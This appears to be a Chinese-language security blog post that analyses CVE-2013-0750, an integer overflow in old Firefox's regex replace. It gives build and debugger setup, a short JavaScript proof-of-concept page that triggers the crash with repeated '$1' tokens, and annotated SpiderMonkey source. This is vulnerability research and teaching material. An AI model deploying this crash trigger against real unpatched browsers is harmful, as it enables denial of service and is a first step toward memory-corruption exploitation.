<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="referrer" content="no-referrer" />
    <meta name="description" content="比较著名的整数溢出漏洞，在很多书籍中都提及过，不过感觉分析得有些小问题，重新调试了一遍 Building Environment for DebugSource code:123#漏洞影响版本&lt;18.0http:&#x2F;&#x2F;releases.mozilla.org&#x2F;pub&#x2F;firefox&#x2F;releases&#x2F;17.0&#x2F;source&amp;">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2013-0750  Firefox">
<meta property="og:url" content="http://yoursite.com/2019/03/02/CVE-2013-0750-Firefox/index.html">
<meta property="og:site_name" content="Kirin&#39;s Blog">
<meta property="og:description" content="比较著名的整数溢出漏洞，在很多书籍中都提及过，不过感觉分析得有些小问题，重新调试了一遍 Building Environment for DebugSource code:123#漏洞影响版本&lt;18.0http:&#x2F;&#x2F;releases.mozilla.org&#x2F;pub&#x2F;firefox&#x2F;releases&#x2F;17.0&#x2F;source&amp;">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-073ce77518c3dbaa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="article:published_time" content="2019-03-02T09:10:29.000Z">
<meta property="article:modified_time" content="2019-03-02T09:11:22.000Z">
<meta property="article:author" content="Kirin">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="Firefox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/7434375-073ce77518c3dbaa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>CVE-2013-0750  Firefox</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2019/03/05/CVE-2012-1856-Office-UAF/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/03/01/CVE-2012-0158-Office-Stack-Overflow/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/03/02/CVE-2013-0750-Firefox/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/03/02/CVE-2013-0750-Firefox/&text=CVE-2013-0750  Firefox" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/03/02/CVE-2013-0750-Firefox/&title=CVE-2013-0750  Firefox" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/03/02/CVE-2013-0750-Firefox/&is_video=false&description=CVE-2013-0750  Firefox" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2013-0750  Firefox&body=Check out this article: http://yoursite.com/2019/03/02/CVE-2013-0750-Firefox/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/03/02/CVE-2013-0750-Firefox/&title=CVE-2013-0750  Firefox" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/03/02/CVE-2013-0750-Firefox/&title=CVE-2013-0750  Firefox" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/03/02/CVE-2013-0750-Firefox/&title=CVE-2013-0750  Firefox" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/03/02/CVE-2013-0750-Firefox/&title=CVE-2013-0750  Firefox" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/03/02/CVE-2013-0750-Firefox/&name=CVE-2013-0750  Firefox&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Building-Environment-for-Debug"><span class="toc-number">1.</span> <span class="toc-text">Building Environment for Debug</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-code"><span class="toc-number">1.1.</span> <span class="toc-text">Source code:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Compile"><span class="toc-number">1.2.</span> <span class="toc-text">Compile:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Environment"><span class="toc-number">1.2.1.</span> <span class="toc-text">Environment</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#To-compile"><span class="toc-number">1.2.2.</span> <span class="toc-text">To compile</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Debug-Environment"><span class="toc-number">1.3.</span> <span class="toc-text">Debug Environment</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analyze"><span class="toc-number">2.</span> <span class="toc-text">Analyze</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        CVE-2013-0750  Firefox
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Kirin's Blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2019-03-02T09:10:29.000Z" itemprop="datePublished">2019-03-02</time>
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/Firefox/" rel="tag">Firefox</a>, <a class="tag-link" href="/tags/PWN/" rel="tag">PWN</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>比较著名的整数溢出漏洞，在很多书籍中都提及过，不过感觉分析得有些小问题，重新调试了一遍</p>
<h2 id="Building-Environment-for-Debug"><a href="#Building-Environment-for-Debug" class="headerlink" title="Building Environment for Debug"></a>Building Environment for Debug</h2><h3 id="Source-code"><a href="#Source-code" class="headerlink" title="Source code:"></a><strong>Source code:</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#漏洞影响版本&lt;18.0</span><br><span class="line">http:&#x2F;&#x2F;releases.mozilla.org&#x2F;pub&#x2F;firefox&#x2F;releases&#x2F;17.0&#x2F;source&#x2F;firefox-17.0.source.tar.bz2  </span><br><span class="line">#unzip by 7-zip</span><br></pre></td></tr></table></figure>
<h3 id="Compile"><a href="#Compile" class="headerlink" title="Compile:"></a><strong>Compile:</strong></h3><h4 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a><strong>Environment</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MozillaBuild 1.7 #http:&#x2F;&#x2F;ftp.mozilla.org&#x2F;pub&#x2F;mozilla&#x2F;libraries&#x2F;win32&#x2F;MozillaBuildSetup-1.7.exe</span><br><span class="line">VS2010</span><br></pre></td></tr></table></figure>
<h4 id="To-compile"><a href="#To-compile" class="headerlink" title="To compile"></a>To compile</h4><p><strong>将编译的配置文件 “\mozilla-release\xulrunner\config\mozconfig” 复制进MozillaBuild安装的根目录</strong><br><strong>编辑 “mozconfig” 为：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#开启debug</span><br><span class="line">ac_add_options --enable-application&#x3D;browser</span><br><span class="line">ac_add_options --enable-debug</span><br><span class="line">ac_add_options --enable-tests</span><br><span class="line">ac_add_options -trace-malloc</span><br><span class="line">ac_add_options --disable-webgl</span><br></pre></td></tr></table></figure>
<p><strong>运行MozillaBuild安装的根目录中的”start-msvc10.bat”来启动VS2010的编译环境</strong><br><strong>在编译shell中进入firefox的源码根目录</strong><br><strong>运行命令：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make -f client.mk build</span><br><span class="line">#最终可执行程序在\mozilla-release\obj-i686-pc-mingw32\dist\bin\firefox.exe</span><br></pre></td></tr></table></figure>
<h3 id="Debug-Environment"><a href="#Debug-Environment" class="headerlink" title="Debug Environment"></a>Debug Environment</h3><p><strong>动态Windbg+静态IDA</strong><br><strong>Windbg配置debug源码路径(firefox源码位置)<br>配置符号文件路径：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H:\Symbols;SRV*H:\Symbols*http:&#x2F;&#x2F;msdl.microsoft.com&#x2F;download&#x2F;symbols;SRV*H:\Symbols*https:&#x2F;&#x2F;symbols.mozilla.org&#x2F;</span><br></pre></td></tr></table></figure>
<h2 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h2><p><strong>POC.html:</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">repeat</span><span class="params">(x, n)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">while</span>(x.length&lt;n) x+=x;</span></span><br><span class="line">            x = x.substring(0, n);</span><br><span class="line"><span class="actionscript">            <span class="keyword">return</span> x;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> s = <span class="string">"1"</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> rep = <span class="string">"$1"</span>;</span></span><br><span class="line">        s = repeat(s, 1&lt;&lt;20);</span><br><span class="line">        rep = repeat(rep, 1&lt;&lt;16);</span><br><span class="line"><span class="javascript">        finial = s.replace(<span class="regexp">/(.+)/g</span>, rep);</span></span><br><span class="line">        alert(finial.length);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>简单说明一下：<br><strong>在JavaScript中调用replace，当第二个参数(替换字符串)为$(1-99)时，会对应前面正则表达式在被替换字符串中匹配的位置，for example:$1表示正则表达式第一个子表达式匹配的位置<br>在firefox旧版本中，会首先计算出替换后字符串长度，所以当构造多个”$1”时会在计算过程中导致整数溢出</strong><br><strong>windbg下运行找到crash位置：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">DoReplace(JSContext *cx, RegExpStatics *res, ReplaceData &amp;rdata)</span><br><span class="line">&#123;</span><br><span class="line">    JSLinearString *repstr = rdata.repstr;</span><br><span class="line">    <span class="keyword">const</span> jschar *cp;</span><br><span class="line">    <span class="keyword">const</span> jschar *bp = cp = repstr-&gt;chars();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> jschar *dp = rdata.dollar;</span><br><span class="line">    <span class="keyword">const</span> jschar *ep = rdata.dollarEnd;</span><br><span class="line">    <span class="keyword">for</span> (; dp; dp = js_strchr_limit(dp, <span class="string">'$'</span>, ep)) &#123;</span><br><span class="line">        <span class="comment">/* Move one of the constant portions of the replacement value. */</span></span><br><span class="line">        <span class="keyword">size_t</span> len = dp - cp;</span><br><span class="line">        rdata.sb.infallibleAppend(cp, len);</span><br><span class="line">        cp = dp;</span><br><span class="line"></span><br><span class="line">        JSSubString sub;</span><br><span class="line">        <span class="keyword">size_t</span> skip;</span><br><span class="line">        <span class="keyword">if</span> (InterpretDollar(cx, res, dp, ep, rdata, &amp;sub, &amp;skip)) &#123;</span><br><span class="line">            len = sub.length;</span><br><span class="line">            rdata.sb.infallibleAppend(sub.chars, len);<span class="comment">//崩溃位置</span></span><br><span class="line">            cp += skip;</span><br><span class="line">            dp += skip;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            dp++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    rdata.sb.infallibleAppend(cp, repstr-&gt;length() - (cp - bp));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>查看函数调用栈：</strong><br><img src="https://upload-images.jianshu.io/upload_images/7434375-073ce77518c3dbaa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Call Stack"><br><strong>crash位置是在ReplaceRegExpCallback调用DoReplace过程中：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">bool</span></span><br><span class="line">ReplaceRegExpCallback(JSContext *cx, RegExpStatics *res, <span class="keyword">size_t</span> count, <span class="keyword">void</span> *p)</span><br><span class="line">&#123;</span><br><span class="line">    ReplaceData &amp;rdata = *<span class="keyword">static_cast</span>&lt;ReplaceData *&gt;(p);</span><br><span class="line"></span><br><span class="line">    rdata.calledBack = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">size_t</span> leftoff = rdata.leftIndex;</span><br><span class="line">    <span class="keyword">size_t</span> leftlen = res-&gt;matchStart() - leftoff;</span><br><span class="line">    rdata.leftIndex = res-&gt;matchLimit();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> replen = <span class="number">0</span>;  <span class="comment">/* silence 'unused' warning */</span></span><br><span class="line">    <span class="keyword">if</span> (!FindReplaceLength(cx, res, rdata, &amp;replen))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> growth = leftlen + replen;</span><br><span class="line">    <span class="keyword">if</span> (!rdata.sb.reserve(rdata.sb.length() + growth))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    JSLinearString &amp;str = rdata.str-&gt;asLinear();  <span class="comment">/* flattened for regexp */</span></span><br><span class="line">    <span class="keyword">const</span> jschar *left = str.chars() + leftoff;</span><br><span class="line"></span><br><span class="line">    rdata.sb.infallibleAppend(left, leftlen); <span class="comment">/* skipped-over portion of the search value */</span></span><br><span class="line">    DoReplace(cx, res, rdata);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>跟进函数，发现问题在FindReplaceLength：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">bool</span></span><br><span class="line">FindReplaceLength(JSContext *cx, RegExpStatics *res, ReplaceData &amp;rdata, <span class="keyword">size_t</span> *sizep)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function">RootedObject <span class="title">base</span><span class="params">(cx, rdata.elembase)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (base) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * The base object is used when replace was passed a lambda which looks like</span></span><br><span class="line"><span class="comment">         * 'function(a) &#123; return b[a]; &#125;' for the base object b.  b will not change</span></span><br><span class="line"><span class="comment">         * in the course of the replace unless we end up making a scripted call due</span></span><br><span class="line"><span class="comment">         * to accessing a scripted getter or a value with a scripted toString.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        JS_ASSERT(rdata.lambda);</span><br><span class="line">        JS_ASSERT(!base-&gt;getOps()-&gt;lookupProperty);</span><br><span class="line">        JS_ASSERT(!base-&gt;getOps()-&gt;getProperty);</span><br><span class="line"></span><br><span class="line">        Value match;</span><br><span class="line">        <span class="keyword">if</span> (!res-&gt;createLastMatch(cx, &amp;match))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        JSString *str = match.toString();</span><br><span class="line"></span><br><span class="line">        JSAtom *atom;</span><br><span class="line">        <span class="keyword">if</span> (str-&gt;isAtom()) &#123;</span><br><span class="line">            atom = &amp;str-&gt;asAtom();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            atom = AtomizeString(cx, str);</span><br><span class="line">            <span class="keyword">if</span> (!atom)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Value v;</span><br><span class="line">        <span class="keyword">if</span> (HasDataProperty(cx, base, AtomToId(atom), &amp;v) &amp;&amp; v.isString()) &#123;</span><br><span class="line">            rdata.repstr = v.toString()-&gt;ensureLinear(cx);</span><br><span class="line">            <span class="keyword">if</span> (!rdata.repstr)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            *sizep = rdata.repstr-&gt;length();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Couldn't handle this property, fall through and despecialize to the</span></span><br><span class="line"><span class="comment">         * general lambda case.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        rdata.elembase = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (JSObject *lambda = rdata.lambda) &#123;</span><br><span class="line">        <span class="function">PreserveRegExpStatics <span class="title">staticsGuard</span><span class="params">(cx, res)</span></span>;</span><br><span class="line">        <span class="keyword">if</span> (!staticsGuard.init(cx))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * In the lambda case, not only do we find the replacement string's</span></span><br><span class="line"><span class="comment">         * length, we compute repstr and return it via rdata for use within</span></span><br><span class="line"><span class="comment">         * DoReplace.  The lambda is called with arguments ($&amp;, $1, $2, ...,</span></span><br><span class="line"><span class="comment">         * index, input), i.e., all the properties of a regexp match array.</span></span><br><span class="line"><span class="comment">         * For $&amp;, etc., we must create string jsvals from cx-&gt;regExpStatics.</span></span><br><span class="line"><span class="comment">         * We grab up stack space to keep the newborn strings GC-rooted.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">unsigned</span> p = res-&gt;parenCount();</span><br><span class="line">        <span class="keyword">unsigned</span> argc = <span class="number">1</span> + p + <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        InvokeArgsGuard &amp;args = rdata.args;</span><br><span class="line">        <span class="keyword">if</span> (!args.pushed() &amp;&amp; !cx-&gt;<span class="built_in">stack</span>.pushInvokeArgs(cx, argc, &amp;args))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        args.setCallee(ObjectValue(*lambda));</span><br><span class="line">        args.setThis(UndefinedValue());</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Push $&amp;, $1, $2, ... */</span></span><br><span class="line">        <span class="keyword">unsigned</span> argi = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (!res-&gt;createLastMatch(cx, &amp;args[argi++]))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; res-&gt;parenCount(); ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!res-&gt;createParen(cx, i + <span class="number">1</span>, &amp;args[argi++]))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Push match index and input string. */</span></span><br><span class="line">        args[argi++].setInt32(res-&gt;matchStart());</span><br><span class="line">        args[argi].setString(rdata.str);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!Invoke(cx, args))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* root repstr: rdata is on the stack, so scanned by conservative gc. */</span></span><br><span class="line">        JSString *repstr = ToString(cx, args.rval());</span><br><span class="line">        <span class="keyword">if</span> (!repstr)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        rdata.repstr = repstr-&gt;ensureLinear(cx);</span><br><span class="line">        <span class="keyword">if</span> (!rdata.repstr)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        *sizep = rdata.repstr-&gt;length();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    JSString *repstr = rdata.repstr;</span><br><span class="line">    <span class="keyword">size_t</span> replen = repstr-&gt;length();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> jschar *dp = rdata.dollar, *ep = rdata.dollarEnd; dp;</span><br><span class="line">         dp = js_strchr_limit(dp, <span class="string">'$'</span>, ep)) &#123;</span><br><span class="line">        JSSubString sub;</span><br><span class="line">        <span class="keyword">size_t</span> skip;</span><br><span class="line">        <span class="keyword">if</span> (InterpretDollar(cx, res, dp, ep, rdata, &amp;sub, &amp;skip)) &#123;</span><br><span class="line">            replen += sub.length - skip;</span><br><span class="line">            dp += skip;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            dp++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *sizep = replen;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>着重看一下后面在表达式存在”$”情况下计算replen的过程：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">JSString *repstr = rdata.repstr;</span><br><span class="line"><span class="keyword">size_t</span> replen = repstr-&gt;length();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> jschar *dp = rdata.dollar, *ep = rdata.dollarEnd; dp;</span><br><span class="line">     dp = js_strchr_limit(dp, <span class="string">'$'</span>, ep)) &#123;</span><br><span class="line">    JSSubString sub;</span><br><span class="line">    <span class="keyword">size_t</span> skip;</span><br><span class="line">    <span class="keyword">if</span> (InterpretDollar(cx, res, dp, ep, rdata, &amp;sub, &amp;skip)) &#123;</span><br><span class="line">        replen += sub.length - skip;</span><br><span class="line">        dp += skip;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        dp++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">*sizep = replen;</span><br></pre></td></tr></table></figure>
